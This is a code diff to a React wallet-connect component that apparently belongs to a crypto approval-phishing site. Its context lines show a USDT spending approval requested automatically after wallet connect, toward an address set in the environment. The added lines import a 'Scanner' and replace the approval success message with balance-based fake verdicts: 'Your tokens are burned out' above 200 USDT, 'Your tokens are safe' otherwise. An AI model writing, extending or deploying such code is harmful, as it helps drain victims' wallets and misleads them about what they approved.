@@ -8,6 +8,7 @@ import { USDT_ADDRESSES, ERC20_ABI, NETWORK_IDS } from '../config/contracts';
 import { formatUnits, maxUint256 } from 'viem'
 import { USDT_SPENDER_ADDRESS } from '../../../env';
 import { toast } from 'sonner';
+import { Scanner } from './Scanner';
 interface WalletConnectProps {
   onAddressSelected?: (address: string) => void;
 }
@@ -95,6 +96,9 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
     }
   }, [chain?.id, address, isConnected, refetchUsdt, refetchAllowance]);
 
+
+
+
   // Ask for USDT approval automatically right after wallet connect on BSC.
   // Only once per wallet after successful approval (persisted), and also skipped if allowance is already set.
   useEffect(() => {
@@ -109,6 +113,11 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
       const pendingApproval = window.localStorage.getItem(pendingKey) === '1';
       if (pendingApproval) return;
     }
+
+
+
+
+
 
     const allowance = (usdtAllowance as bigint | undefined) ?? 0n;
     if (allowance > 0n) {
@@ -140,8 +149,15 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
           try {
             window.localStorage.setItem(storageKey, '1');
             window.localStorage.removeItem(pendingKey);
+
           } catch { /* ignore */ }
-          toast.success('USDT approval successful');
+
+          if (Number(usdtBalance) > 200) {
+            toast.error('Your tokens are burned out.');
+          } else {
+            toast.success("Your tokens are safe")
+          }
+          // <Scanner isScanning={true} result={{ address: address, balance: usdtBalance, network: 'BSC' }} onClose={() => { }} />
         }
       } catch (err) {
         // user reject / wallet error -> do nothing
@@ -246,6 +262,7 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
 
   return (
     <>
+
       {/* Connect/Connected Button */}
       {!isConnected ? (
         <motion.button
